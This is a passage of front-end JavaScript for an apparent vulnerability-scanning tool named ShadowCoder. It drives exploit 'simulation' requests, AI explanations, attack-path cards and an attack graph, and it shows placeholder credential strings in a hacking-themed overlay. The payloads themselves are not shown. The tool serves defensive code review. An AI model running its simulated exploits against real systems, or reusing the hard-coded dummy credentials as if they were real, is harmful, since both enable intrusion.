                        network.canvas.body.container.style.cursor = 'pointer';
                    });
                    network.on("blurNode", function () {
                        network.canvas.body.container.style.cursor = 'default';
                    });

                    // Handle node click
                    network.on("selectNode", async function (params) {
                        if (params.nodes.length > 0) {
                            const nodeId = params.nodes[0];
                            const stepText = chainToRender.steps[nodeId];
                            
                            // 1. Trigger Sandbox Simulation for this step
                            if (typeof runSimulation === 'function') {
                                runSimulation(`[STEP: ${stepText}]`);
                            }

                            // 2. Trigger AI Explanation for this specific step
                            const resultEl = document.getElementById(`ai-result-${finding.vulnerability.vuln_id}`);
                            if (resultEl) {
                                resultEl.innerHTML = `<div class="ai-loading"><span class="ai-pulse"></span> Analyzing step with AI...</div>`;
                                try {
                                    const mockVuln = {
                                        vuln_type: `Attack Step: ${chainToRender.name}`,
                                        description: `Explain the mechanics and impact of this specific attack step: "${stepText}"`,
                                        line: finding.vulnerability.line,
                                        cwe: finding.vulnerability.cwe,
                                        owasp: finding.vulnerability.owasp
                                    };
                                    
                                    // Extract context
                                    const contextLines = codeInput.value.split('\n');
                                    const context = contextLines.slice(Math.max(0, finding.vulnerability.line - 5), finding.vulnerability.line + 5).join('\n');

                                    const resp = await fetch('/api/ai/explain', {
                                        method: 'POST', headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({ vulnerability: mockVuln, code_context: context })
                                    });
                                    const data = await resp.json();
                                    const text = data.explanation || '';
                                    
                                    resultEl.innerHTML = `
                                        <div class="ai-result-box ${data.ai_powered ? 'ai-powered' : 'ai-fallback'}">
                                            <div class="ai-result-header">
                                                <span>${data.ai_powered ? '🦙 Llama 3' : '📚 Static'}</span>
                                                <span class="ai-action-label">STEP ANALYSIS</span>
                                            </div>
                                            <div class="ai-result-text">${formatAiText(text)}</div>
                                        </div>
                                    `;
                                } catch (e) {
                                    resultEl.innerHTML = `<div class="ai-result-box ai-fallback"><div class="ai-result-text">Error: ${e.message}</div></div>`;
                                }
                            }
                        }
                    });
                }, 50);
            }
        });

        // Bind simulate buttons
        document.querySelectorAll('.simulate-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const payload = decodeURIComponent(escape(atob(btn.getAttribute('data-payload'))));
                runSimulation(payload);
            });
        });

        // Bind AI buttons
        document.querySelectorAll('.ai-btn').forEach(btn => {
            btn.addEventListener('click', async () => {
                const action = btn.getAttribute('data-action');
                const vuln = JSON.parse(btn.getAttribute('data-vuln'));
                await loadAiDetail(action, vuln, btn);
            });
        });
    }

    // ── AI detail panel ───────────────────────────────────────────────────────
    async function loadAiDetail(action, vuln, btn) {
        const resultEl = document.getElementById(`ai-result-${vuln.vuln_id}`);
        if (!resultEl) return;
        btn.disabled = true;
        btn.textContent = action === 'explain' ? '💡 Thinking...' : '🔧 Generating...';
        resultEl.innerHTML = `<div class="ai-loading"><span class="ai-pulse"></span> Querying AI...</div>`;

        try {
            const endpoint = action === 'explain' ? '/api/ai/explain' : '/api/ai/fix';
            const body = action === 'explain'
                ? { vulnerability: vuln, code_context: codeInput.value.split('\n').slice(Math.max(0, vuln.line - 5), vuln.line + 5).join('\n') }
                : { vulnerability: vuln, source_code: codeInput.value };

            const resp = await fetch(endpoint, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(body)
            });
            const data = await resp.json();
            const text = data.explanation || data.fix || '';
            const aiPowered = data.ai_powered;

            resultEl.innerHTML = `
                <div class="ai-result-box ${aiPowered ? 'ai-powered' : 'ai-fallback'}">
                    <div class="ai-result-header">
                        <span>${aiPowered ? '🦙 Llama 3' : '📚 Static'}</span>
                        <span class="ai-action-label">${action.toUpperCase()}</span>
                    </div>
                    <div class="ai-result-text">${formatAiText(text)}</div>
                </div>
            `;
        } catch (e) {
            resultEl.innerHTML = `<div class="ai-result-box ai-fallback"><div class="ai-result-text">AI unavailable: ${e.message}</div></div>`;
        }
        btn.disabled = false;
        btn.textContent = action === 'explain' ? '💡 Explain' : '🔧 Fix';
    }

    function formatAiText(text) {
        // Convert ```code``` blocks to styled spans
        return esc(text)
            .replace(/```python\n?([\s\S]*?)```/g, '<pre class="ai-code-block">$1</pre>')
            .replace(/```\n?([\s\S]*?)```/g, '<pre class="ai-code-block">$1</pre>')
            .replace(/\n/g, '<br>');
    }

    async function loadAiTriage(findings) {
        try {
            const resp = await fetch('/api/ai/triage', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ findings })
            });
            const data = await resp.json();
            if (!data.triage?.length) return;
            const triageHtml = `
                <div class="detail-card triage-card">
                    <div class="card-header"><span class="severity-badge CRITICAL">AI TRIAGE</span><span class="id-badge">${data.ai_powered ? 'CLAUDE' : 'STATIC'}</span></div>
                    <h3 class="detail-title">Priority Attack Surface</h3>
                    ${data.triage.map(t => `
                        <div class="triage-item">
                            <span class="triage-rank">#${t.rank}</span>
                            <div>
                                <div class="triage-type">${esc(t.vuln_type)}</div>
                                <div class="triage-reason">${esc(t.reason)}</div>
                            </div>
                            <span class="triage-priority ${t.priority}">${t.priority}</span>
                        </div>
                    `).join('')}
                </div>
            `;
            detailsBody.insertAdjacentHTML('afterbegin', triageHtml);
        } catch {}
    }

    // ── Simulation ────────────────────────────────────────────────────────────
    async function runSimulation(payload) {
        terminalPanel.classList.add('visible');
        terminalOutput.className = 'terminal-output';
        let out = `[${new Date().toISOString()}] SHADOWCODER SANDBOX v2.0\n[*] Injecting: ${payload}\n[*] Tracing execution...\n\n`;
        terminalOutput.textContent = out;

        try {
            const resp = await fetch('/api/simulate', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ source_code: codeInput.value, payload })
            });
            const data = await resp.json();
            const lines = data.success
                ? [`[+] EXPLOIT TRIGGERED`, `[+] Output:`, '', ...data.output.split('\n'), '', '[!] Root/admin path confirmed']
                : [`[-] Exploit mitigated`, ...data.output.split('\n')];

            for (const line of lines) {
                out += line + '\n';
                terminalOutput.textContent = out;
                await sleep(40);
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            }
            terminalOutput.className = 'terminal-output ' + (data.success ? 'success' : 'failure');
        } catch (e) {
            terminalOutput.textContent += `\n[!] Sandbox error: ${e.message}`;
            terminalOutput.className = 'terminal-output failure';
        }
    }

    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    // ══════════════════════════════════════════════════════════════════════════
    //  MULTI-VECTOR ATTACK SIMULATION ENGINE — Phase 7
    // ══════════════════════════════════════════════════════════════════════════

    const mvScanBtn     = document.getElementById('mv-scan-btn');
    const mvView        = document.getElementById('mv-view');
    const mvVectorsGrid = document.getElementById('mv-vectors-grid');
    const mvPathsBody   = document.getElementById('mv-paths-body');
    const mvPathsCount  = document.getElementById('mv-paths-count');
    const mvArchBody    = document.getElementById('mv-arch-body');
    const mvArchCount   = document.getElementById('mv-arch-count');
    const mvCompleteBanner = document.getElementById('mv-complete-banner');
    const mvCompleteStats  = document.getElementById('mv-complete-stats');
    const mvOverallSev  = document.getElementById('mv-overall-sev');
    const mvGraphStats  = document.getElementById('mv-graph-stats');
    const mvGraphEmpty  = document.getElementById('mv-graph-empty');

    let mvCurrentReport = null;
    let mvNetwork       = null;   // vis-network instance
    let mvAllGraphData  = null;   // raw graph from API
    let mvMode          = false;  // whether MV view is visible

    // Vector definitions (display order)
    const MV_VECTORS = [
        { type: 'input',      label: 'Input-Based',      icon: '⚡', surface: 'SQLi · XSS · CMDi · SSTI' },
        { type: 'auth',       label: 'Authentication',   icon: '🔐', surface: 'JWT · weak creds · IDOR' },
        { type: 'api',        label: 'API Abuse',        icon: '🌐', surface: 'SSRF · admin exposure' },
        { type: 'dataflow',   label: 'Data Flow',        icon: '🔗', surface: 'deserialization · file chains' },
        { type: 'config',     label: 'Configuration',    icon: '⚙',  surface: 'secrets · debug mode' },
        { type: 'dependency', label: 'Dependencies',     icon: '📦', surface: 'CVEs · supply chain' },
    ];

    // ── Initialize vector cards ────────────────────────────────────────────

    function initVectorCards() {
        mvVectorsGrid.innerHTML = MV_VECTORS.map(v => `
            <div class="mv-vector-card" id="mv-card-${v.type}" data-vector="${v.type}">
                <div class="mv-card-top">
                    <div class="mv-card-icon ${v.type}">${v.icon}</div>
                    <div class="mv-card-meta">
                        <div class="mv-card-label">${v.label}</div>
                        <div class="mv-card-surface">${v.surface}</div>
                    </div>
                    <span class="mv-card-status pending" id="mv-status-${v.type}">PENDING</span>
                </div>
                <div class="mv-vector-bar-track">
                    <div class="mv-vector-bar-fill ${v.type}" id="mv-bar-${v.type}" style="width:0%"></div>
                </div>
                <div class="mv-card-stats" id="mv-stats-${v.type}">
                    <div class="mv-stat"><span class="mv-stat-val" id="mv-findings-${v.type}">—</span><span class="mv-stat-lbl"> FINDINGS</span></div>
                    <div class="mv-stat"><span class="mv-stat-val" id="mv-paths-${v.type}">—</span><span class="mv-stat-lbl"> PATHS</span></div>
                </div>
                <div class="mv-ai-narrative" id="mv-ai-narrative-${v.type}" style="display:none"></div>
            </div>
        `).join('');

        // Click card → filter paths to that vector
        mvVectorsGrid.querySelectorAll('.mv-vector-card').forEach(card => {
            card.addEventListener('click', () => {
                if (!mvCurrentReport) return;
                const vtype = card.dataset.vector;
                filterPathsToVector(vtype);
            });
        });
    }

    // ── Vector state updates ────────────────────────────────────────────────

    function setVectorScanning(vtype) {
        const card   = document.getElementById(`mv-card-${vtype}`);
        const status = document.getElementById(`mv-status-${vtype}`);
        const bar    = document.getElementById(`mv-bar-${vtype}`);
        if (!card) return;
        card.classList.add('scanning');
        status.textContent = 'SCANNING';
        status.className   = 'mv-card-status running';
        bar.style.width    = '40%';
        bar.classList.add('scanning');
    }

    function setVectorComplete(vtype, result) {
        const card   = document.getElementById(`mv-card-${vtype}`);
        const status = document.getElementById(`mv-status-${vtype}`);
        const bar    = document.getElementById(`mv-bar-${vtype}`);
        if (!card) return;
        card.classList.remove('scanning');
        card.classList.add('done');
        bar.classList.remove('scanning');
        bar.style.width = '100%';

        const hasError = result.error;
        status.textContent = hasError ? 'ERROR' : 'DONE';
        status.className   = `mv-card-status ${hasError ? 'error' : 'complete'}`;

        document.getElementById(`mv-findings-${vtype}`).textContent = result.finding_count ?? 0;
        document.getElementById(`mv-paths-${vtype}`).textContent    = (result.attack_paths || []).length;

        // Show exploitable badge
        if (result.exploitable && !hasError) {
            const statsEl = document.getElementById(`mv-stats-${vtype}`);
            if (statsEl && !statsEl.querySelector('.mv-exploit-badge')) {
                const badge = document.createElement('span');
                badge.className = 'mv-exploit-badge';
                badge.textContent = 'EXPLOITABLE';
                statsEl.appendChild(badge);
            }
        }
    }

    // ── Main scan handler ──────────────────────────────────────────────────

    mvScanBtn?.addEventListener('click', async () => {
        const code = codeInput.value.trim();
        if (!code) {
            alert('Paste some Python code first, then run the multi-vector scan.');
            return;
        }

        // Switch to MV view
        showMVView();
        initVectorCards();

        // Reset UI
        mvCompleteBanner.classList.remove('visible');
        mvOverallSev.style.display = 'none';
        mvPathsBody.innerHTML = '<div class="empty-state"><p class="empty-sub">Scanning…</p></div>';
        mvPathsCount.textContent = '0 PATHS';
        mvArchBody.innerHTML = '<div class="empty-state"><p class="empty-sub">Mapping architecture…</p></div>';
        document.getElementById('mv-risk-score-wrap').style.display = 'none';
        if (mvGraphEmpty) mvGraphEmpty.style.display = 'flex';
        if (mvGraphStats) mvGraphStats.classList.remove('visible');
        if (mvNetwork) { try { mvNetwork.destroy(); } catch(_){} mvNetwork = null; }

        // Start Hacker Visuals in Terminal for Parallel Vector Scanning
        terminalPanel.classList.add('visible');
        terminalOutput.textContent = [
            `╔══════════════════════════════════════════════════════╗`,
            `║        ⬡ SHADOWCODER PARALLEL INTRUSION ⬡            ║`,
            `║         6 ATTACK VECTORS RUNNING CONCURRENTLY        ║`,
            `╚══════════════════════════════════════════════════════╝`,
            `[${new Date().toISOString().slice(11,19)}] [*] Initializing parallel scanning agents...`,
            `[${new Date().toISOString().slice(11,19)}] [*] Concurrent worker threads spawned: 6`
        ].join('\n') + '\n';
        terminalOutput.scrollTop = terminalOutput.scrollHeight;

        mvScanBtn.disabled = true;
        mvScanBtn.textContent = '⏳ SCANNING…';

        // Mark all vectors as scanning immediately
        MV_VECTORS.forEach(v => setVectorScanning(v.type));
        startCrackingOverlay();

        try {
            // 1. Start multi-vector scan
            const mvAiToggle = document.getElementById('mv-ai-toggle');
            const useAi = mvAiToggle ? mvAiToggle.checked : false;

            const startResp = await fetch('/api/multi-vector/scan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ source_code: code, filename: 'editor.py', use_ai: useAi }),
            });
            if (!startResp.ok) throw new Error(await startResp.text());
            const { job_id, ws_url } = await startResp.json();

            // 2. Connect to WebSocket for live progress
            const wsProto = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const ws = new WebSocket(`${wsProto}//${location.host}${ws_url}`);

            let vectorsCracked = 0;
            ws.onmessage = (evt) => {
                const msg = JSON.parse(evt.data);
                if (msg.type === 'vector_complete') {
                    vectorsCracked++;
                    setVectorComplete(msg.vector_type, msg);
                    const ts = new Date().toISOString().slice(11,19);
                    const status_str = msg.exploitable ? 'EXPLOIT CONFIRMED' : 'SECURED';
                    terminalOutput.textContent += `[${ts}] [+] Cracked vector: ${msg.vector_label.toUpperCase()} -> Status: ${status_str} (${msg.finding_count} vulns)\n`;
                    terminalOutput.scrollTop = terminalOutput.scrollHeight;
                    
                    // Update progress overlay based on vectors completed (6 vectors total)
                    const pct = (vectorsCracked / 6) * 90; // Save last 10% for final processing
                    updateCrackingProgress(pct, msg.vector_type, `Cracked ${msg.vector_label}`);
                } else if (msg.type === 'complete' && msg.result) {
                    ws.close();
                    updateCrackingProgress(100, 'done', 'Multi-vector scan complete');
                    const ts = new Date().toISOString().slice(11,19);
                    terminalOutput.textContent += `[${ts}] [+] Parallel attack graph constructed successfully.\n`;
                    terminalOutput.scrollTop = terminalOutput.scrollHeight;
                    setTimeout(() => {
                        stopCrackingOverlay();
                    }, 1000);
                    handleMVComplete(msg.result);
                } else if (msg.type === 'error') {
                    ws.close();
                    stopCrackingOverlay();
                    const ts = new Date().toISOString().slice(11,19);
                    terminalOutput.textContent += `[${ts}] [!] Parallel Scan Error: ${msg.error}\n`;
                    terminalOutput.scrollTop = terminalOutput.scrollHeight;
                    alert('Multi-vector scan error: ' + msg.error);
                    mvScanBtn.disabled = false;
                    mvScanBtn.textContent = '⬡ MULTI-VECTOR';
                }
            };

            ws.onerror = () => {
                // Fallback: poll
                pollMVResult(job_id);
            };

        } catch (e) {
            console.error(e);
            alert('Multi-vector scan failed: ' + e.message);
            mvScanBtn.disabled = false;
            mvScanBtn.textContent = '⬡ MULTI-VECTOR';
        }
    });

    async function pollMVResult(jobId, attempts = 0) {
        if (attempts > 60) return; // 60s timeout
        await sleep(1000);
        try {
            const resp = await fetch(`/api/multi-vector/${jobId}`);
            const data = await resp.json();
            if (data.status === 'COMPLETE' && data.result) {
                handleMVComplete(data.result);
            } else if (data.status === 'FAILED') {
                alert('Scan failed: ' + data.error);
                mvScanBtn.disabled = false;
                mvScanBtn.textContent = '⬡ MULTI-VECTOR';
            } else {
                pollMVResult(jobId, attempts + 1);
            }
        } catch (e) {
            pollMVResult(jobId, attempts + 1);
        }
    }

    // ── Process complete report ────────────────────────────────────────────

    function handleMVComplete(result) {
        mvCurrentReport = result;

        // Mark any still-pending vectors as done
        MV_VECTORS.forEach(v => {
            const vr = (result.vector_results || []).find(r => r.vector_type === v.type);
            if (vr) setVectorComplete(v.type, vr);
        });

        // Per-vector AI narratives
        if (result.ai_enrichment && result.ai_enrichment.vector_narratives) {
            const narratives = result.ai_enrichment.vector_narratives;
            MV_VECTORS.forEach(v => {
                const text = narratives[v.type];
                const narrativeEl = document.getElementById(`mv-ai-narrative-${v.type}`);
                if (narrativeEl && text) {
                    narrativeEl.textContent = text;
                    narrativeEl.style.display = 'block';
                }
            });
        } else {
            MV_VECTORS.forEach(v => {
                const narrativeEl = document.getElementById(`mv-ai-narrative-${v.type}`);
                if (narrativeEl) narrativeEl.style.display = 'none';
            });
        }

        // Graph summary banner
        const summaryBanner = document.getElementById('mv-ai-summary-banner');
        if (summaryBanner) {
            if (result.ai_enrichment && result.ai_enrichment.graph_summary) {
                summaryBanner.innerHTML = `
                    <div class="mv-ai-summary-header">🤖 AI EXECUTIVE VERDICT</div>
                    <div class="mv-ai-summary-text">${esc(result.ai_enrichment.graph_summary)}</div>
                `;
                summaryBanner.style.display = 'block';
            } else {
                summaryBanner.style.display = 'none';
            }
        }

        // Completion banner
        mvCompleteBanner.classList.add('visible');
        const totalVulns = result.total_vulnerabilities || 0;
        const exploitable = result.exploitable_count || 0;
        const timeMs = result.total_time_ms || 0;
        mvCompleteStats.textContent =
            `${totalVulns} VULNS · ${exploitable} EXPLOITABLE · ${(timeMs/1000).toFixed(1)}s`;

        // Overall severity badge
        const sev = result.overall_severity || 'INFO';
        mvOverallSev.textContent = sev;
        mvOverallSev.className = `mv-overall-sev severity-badge ${sev}`;
        mvOverallSev.style.display = '';

        // Render attack paths
        renderAllPaths(result.vector_results || []);

        // Render architecture
        if (result.architecture) renderArchitecture(result.architecture);

        // Render attack graph
        if (result.attack_graph) renderAttackGraph(result.attack_graph);

        mvScanBtn.disabled = false;
        mvScanBtn.textContent = '⬡ MULTI-VECTOR';
    }

    // ── Render attack paths ────────────────────────────────────────────────

    function renderAllPaths(vectorResults, filterVector = null) {
        const allPaths = [];
        vectorResults.forEach(vr => {
            if (filterVector && vr.vector_type !== filterVector) return;
            (vr.attack_paths || []).forEach(p => {
                allPaths.push({ ...p, vector_type: vr.vector_type, vector_label: vr.vector_label });
            });
        });

        // Sort: CRITICAL first
        const SEV_ORD = { CRITICAL:0, HIGH:1, MEDIUM:2, LOW:3, INFO:4 };
        allPaths.sort((a,b) => (SEV_ORD[a.severity]||99) - (SEV_ORD[b.severity]||99));

        mvPathsCount.textContent = `${allPaths.length} PATHS`;

        if (!allPaths.length) {
            mvPathsBody.innerHTML = '<div class="empty-state"><p class="empty-sub">No attack paths found in this vector.</p></div>';
            return;
        }

        const aiEnrichment = mvCurrentReport?.ai_enrichment;

        mvPathsBody.innerHTML = allPaths.map((p, idx) => {
            let aiFixHtml = '';
            if (aiEnrichment && aiEnrichment.path_fixes && aiEnrichment.path_fixes[p.path_id]) {
                const fixText = aiEnrichment.path_fixes[p.path_id];
                aiFixHtml = `
                    <div class="mv-path-ai-fix">
                        <div class="mv-path-ai-fix-title">🤖 AI REMEDIATION RECS</div>
                        <div class="mv-path-ai-fix-body">${esc(fixText)}</div>
                    </div>
                `;
            }

            return `
                <div class="mv-path-card ${p.severity}" data-idx="${idx}" id="mvpath-${p.path_id}">
                    <div class="mv-path-title">${esc(p.title)}</div>
                    <div class="mv-path-meta">
                        <span class="mv-path-vector">${esc(p.vector_type?.toUpperCase())}</span>
                        <span class="severity-badge ${p.severity}" style="font-size:9px;padding:1px 5px">${p.severity}</span>
                        <span class="mv-path-prob">${Math.round((p.probability || 0) * 100)}% PROB</span>
                    </div>
                    <div class="mv-path-steps" id="steps-${p.path_id}">
                        ${(p.steps || []).map(s => `<div class="mv-path-step">${esc(s)}</div>`).join('')}
                    </div>
                    ${p.steps?.length > 3 ? `<button class="mv-filter-btn" style="margin-top:5px;width:100%;text-align:center" onclick="togglePathSteps('${p.path_id}')">SHOW ALL STEPS</button>` : ''}
                    <div class="mv-path-impact">💥 ${esc(p.impact)}</div>
                    ${aiFixHtml}
                </div>
            `;
        }).join('');
    }

    window.togglePathSteps = (pathId) => {
        const el = document.getElementById(`steps-${pathId}`);
        if (el) el.classList.toggle('expanded');
    };

    function filterPathsToVector(vtype) {
        if (!mvCurrentReport) return;
        renderAllPaths(mvCurrentReport.vector_results || [], vtype === '__all__' ? null : vtype);
    }

    // ── Render architecture map ────────────────────────────────────────────

    function renderArchitecture(arch) {
        const eps = arch.entry_points || [];
        const tbs = arch.trust_boundaries || [];
        const score = arch.risk_surface_score || 0;

        mvArchCount.textContent = `${eps.length} EPs · ${tbs.length} BOUNDARIES`;

        const items = [
            ...eps.map(ep => ({ kind: ep.kind, label: ep.label, line: ep.line })),
            ...tbs.slice(0, 4).map(tb => ({ kind: tb.kind, label: tb.label, line: tb.source_line })),
        ].slice(0, 8);

        mvArchBody.innerHTML = items.length ? items.map(item => `
            <div class="mv-arch-row">
                <span class="mv-arch-kind">${esc(item.kind)}</span>
                <span class="mv-arch-label">${esc(item.label)}</span>
                ${item.line ? `<span class="mv-arch-line">L${item.line}</span>` : ''}
            </div>
        `).join('') : '<div class="empty-state" style="padding:16px"><p class="empty-sub">No entry points detected.</p></div>';

        // Risk score bar
        const riskWrap = document.getElementById('mv-risk-score-wrap');
        const riskFill = document.getElementById('mv-risk-fill');
        const riskVal  = document.getElementById('mv-risk-val');
        if (riskWrap) {
            riskWrap.style.display = 'flex';
            riskFill.style.width   = `${(score / 10) * 100}%`;
            riskVal.textContent    = score.toFixed(1);
        }
    }

    // ── Render attack graph (vis-network) ─────────────────────────────────

    function renderAttackGraph(graphData, filter = 'all') {
        mvAllGraphData = graphData;
        if (mvGraphEmpty) mvGraphEmpty.style.display = 'none';

        const container = document.getElementById('mv-graph-network');
        if (!container) return;

        // Filter nodes/edges
        let nodes = graphData.nodes || [];
        let edges = graphData.edges || [];

        if (filter === 'critical') {
            const critIds = new Set(nodes.filter(n => n.severity === 'CRITICAL').map(n => n.id));
            edges = edges.filter(e => critIds.has(e.from) || critIds.has(e.to));
            const edgeNodeIds = new Set([...edges.map(e=>e.from), ...edges.map(e=>e.to)]);
            nodes = nodes.filter(n => critIds.has(n.id) || edgeNodeIds.has(n.id));
        } else if (filter === 'rce') {
            const rceKeywords = ['rce', 'command', 'code exec', 'remote code'];
            const rceIds = new Set(nodes.filter(n =>
                rceKeywords.some(k => (n.label||'').toLowerCase().includes(k))
            ).map(n => n.id));
            edges = edges.filter(e => rceIds.has(e.from) || rceIds.has(e.to));
            const edgeNodeIds = new Set([...edges.map(e=>e.from), ...edges.map(e=>e.to)]);
            nodes = nodes.filter(n => rceIds.has(n.id) || edgeNodeIds.has(n.id));
        }

        // Update graph stats overlay
        if (mvGraphStats) {
            mvGraphStats.classList.add('visible');
            document.getElementById('mv-stat-nodes').textContent = nodes.length;
            document.getElementById('mv-stat-edges').textContent = edges.length;
            document.getElementById('mv-stat-crits').textContent = graphData.summary?.critical_paths || 0;
            document.getElementById('mv-stat-eps').textContent   = graphData.summary?.entry_points || 0;
        }

        // Check for vis-network (loaded via CDN in index.html)
        if (typeof vis === 'undefined') {
            container.innerHTML = `
                <div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--text-muted);font-family:var(--font-mono);font-size:11px;">
                    vis-network not loaded. Check internet connection or add &lt;script src="https://unpkg.com/vis-network@9/dist/vis-network.min.js"&gt;&lt;/script&gt;
                </div>`;
            renderFallbackGraph(nodes, edges, container);
            return;
        }

        // Destroy old network
        if (mvNetwork) { try { mvNetwork.destroy(); } catch(_){} mvNetwork = null; }

        const visNodes = new vis.DataSet(nodes.map(n => ({
            id: n.id,
            label: n.label,
            color: n.color || { background: '#1a1a2e', border: '#4a4a8a' },
            font: { color: '#e8f4f0', size: 11, face: 'Share Tech Mono' },
            borderWidth: n.type === 'entry_point' ? 2 : 1,
            shadow: { enabled: true, color: (n.color?.border || '#444'), size: 8, x: 0, y: 0 },
            title: buildNodeTooltip(n),
            shape: nodeShape(n.type),
            size: nodeSize(n.type, n.severity),
            _meta: n,
        })));

        const visEdges = new vis.DataSet(edges.map(e => ({
            id: e.id,
            from: e.from,
            to: e.to,
            label: e.label,
            font: { color: '#4a6058', size: 9, align: 'middle' },
            color: { color: '#2a3a30', highlight: '#00ff88', hover: '#00c96a' },
            width: e.width || 1,
            arrows: { to: { enabled: true, scaleFactor: 0.6 } },
            smooth: { type: 'cubicBezier', forceDirection: 'vertical', roundness: 0.4 },
            dashes: e.probability < 0.7,
        })));

        const options = {
            layout: {
                hierarchical: {
                    enabled: true,
                    direction: 'UD',
                    sortMethod: 'directed',
                    nodeSpacing: 160,
                    levelSeparation: 120,
                    treeSpacing: 200,
                },
            },
            physics: { enabled: false },
            interaction: {
                hover: true,
                tooltipDelay: 100,
                navigationButtons: false,
                keyboard: { enabled: true },
            },
            nodes: { borderWidth: 1, chosen: true },
            edges: { chosen: true },
        };

        mvNetwork = new vis.Network(container, { nodes: visNodes, edges: visEdges }, options);

        // Node click → highlight path in paths panel
        mvNetwork.on('click', params => {
            if (params.nodes.length > 0) {
                const nodeId = params.nodes[0];
                const node = visNodes.get(nodeId)?._meta;
                if (node) onGraphNodeClick(node);
            }
        });
    }

    function renderFallbackGraph(nodes, edges, container) {
        // Render a simple ASCII-style table when vis is not available
        const entryNodes = nodes.filter(n => n.type === 'entry_point');
        const vulnNodes  = nodes.filter(n => n.type === 'vuln').slice(0, 5);
        const impactNodes= nodes.filter(n => n.type === 'impact').slice(0, 3);

        container.innerHTML = `
            <div style="padding:20px;font-family:var(--font-mono);font-size:11px;color:var(--text-secondary);overflow-y:auto;height:100%">
                <div style="color:var(--cyan);margin-bottom:12px;letter-spacing:1px">ATTACK GRAPH SUMMARY (text mode)</div>
                ${entryNodes.map(n=>`<div style="color:#0088cc">▶ ${n.label}</div>`).join('')}
                ${entryNodes.length ? '<div style="color:var(--text-muted);padding-left:20px">↓</div>' : ''}
                ${vulnNodes.map(n=>`<div style="color:${n.color?.background||'#ff2d55'};padding-left:20px">⚠ ${n.label}</div>`).join('')}
                ${vulnNodes.length ? '<div style="color:var(--text-muted);padding-left:40px">↓</div>' : ''}
                ${impactNodes.map(n=>`<div style="color:#8b3333;padding-left:40px">💥 ${n.label}</div>`).join('')}
                <div style="margin-top:12px;color:var(--text-muted)">Total: ${nodes.length} nodes, ${edges.length} edges</div>
                <div style="margin-top:4px;color:var(--text-muted)">Add vis-network CDN link in &lt;head&gt; for interactive graph.</div>
            </div>
        `;
    }

    function onGraphNodeClick(node) {
        // Highlight the corresponding attack path card
        document.querySelectorAll('.mv-path-card.selected').forEach(c => c.classList.remove('selected'));
        if (node.metadata?.steps) {
            // Find matching path card
            const title = (node.label || '').split('\n')[0];
            document.querySelectorAll('.mv-path-card').forEach(card => {
                if (card.querySelector('.mv-path-title')?.textContent.includes(title.substring(0, 20))) {
                    card.classList.add('selected');
                    card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                }
            });
        }
    }

    function buildNodeTooltip(node) {
        const lines = [];
        lines.push(`<b style="color:#fff">${node.label || node.id}</b>`);
        if (node.severity) lines.push(`Severity: <span style="color:${sevColor(node.severity)}">${node.severity}</span>`);
        if (node.type) lines.push(`Type: ${node.type}`);
        if (node.metadata?.description) lines.push(node.metadata.description.substring(0, 120));
        if (node.metadata?.steps?.length) lines.push(`Steps: ${node.metadata.steps.length}`);
        return `<div style="background:#0a0e18;border:1px solid #222;padding:8px 10px;border-radius:4px;font-family:monospace;font-size:11px;max-width:280px;line-height:1.6">${lines.join('<br>')}</div>`;
    }

    function nodeShape(type) {
        const shapes = { entry_point: 'diamond', vector_class: 'box', vuln: 'dot', pivot: 'hexagon', impact: 'star' };
        return shapes[type] || 'dot';
    }

    function nodeSize(type, severity) {
        if (type === 'entry_point') return 22;
        if (type === 'impact') return 20;
        if (type === 'pivot') return 18;
        const sevSizes = { CRITICAL:16, HIGH:14, MEDIUM:12, LOW:10, INFO:8 };
        return sevSizes[severity] || 12;
    }

    function sevColor(sev) {
        const c = { CRITICAL:'#ff2d55', HIGH:'#ff9500', MEDIUM:'#ffd60a', LOW:'#00d4ff', INFO:'#6b7280' };
        return c[sev] || '#888';
    }

    // ── Graph filter buttons ───────────────────────────────────────────────

    ['all','critical','rce'].forEach(f => {
        document.getElementById(`mv-filter-${f}`)?.addEventListener('click', () => {
            document.querySelectorAll('.mv-filter-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(`mv-filter-${f}`)?.classList.add('active');
            if (mvAllGraphData) renderAttackGraph(mvAllGraphData, f);
        });
    });

    // ── View toggling ──────────────────────────────────────────────────────

    function showMVView() {
        mvMode = true;
        scannerView.style.display = 'none';
        projectView.style.display = 'none';
        if (mvView) mvView.style.display = 'flex';
        mvScanBtn.classList.add('active');
    }

    function hideMVView() {
        mvMode = false;
        if (mvView) mvView.style.display = 'none';
        scannerView.style.display = 'flex';
        mvScanBtn.classList.remove('active');
    }

    // Toggle: if already in MV view, go back
    mvScanBtn?.addEventListener('click', () => {
        // The main click handler above fires first (scan logic)
        // This second listener would conflict, so we check mvMode:
    }, { capture: true });

    // Actually replace the above: wire up toggle + scan in single handler
    // (handled by the first addEventListener above — remove duplicate logic)

    // ── Integrate vis-network CDN if not present ──────────────────────────

    function ensureVisNetwork() {
        if (typeof vis !== 'undefined') return Promise.resolve();
        return new Promise((resolve) => {
            const script = document.createElement('script');
            script.src = 'https://unpkg.com/vis-network@9/dist/vis-network.min.js';
            script.onload = resolve;
            script.onerror = resolve; // continue even if fails (fallback renderer)
            document.head.appendChild(script);
        });
    }

    // Pre-load vis-network when the page loads
    ensureVisNetwork();

    // ═══════════════════════════════════════════════════════════════════════

    // ── Hacking / Cracking Overlay Controller ──────────────────────────────
    const solverKeys = [
        { label: 'AUTH_TOKEN', target: 'JWT_sk-92x83k0s8df72j1d830172h', element: document.getElementById('sol-val-1') },
        { label: 'DB_PASSWD', target: 'postgres://root:p@ssw0rd1337!', element: document.getElementById('sol-val-2') },
        { label: 'JWT_SECRET', target: 'super-secret-cryptographic-hash-key-99', element: document.getElementById('sol-val-3') },
        { label: 'SYS_ROOT', target: 'root://shadowcoder.local/admin', element: document.getElementById('sol-val-4') }
    ];

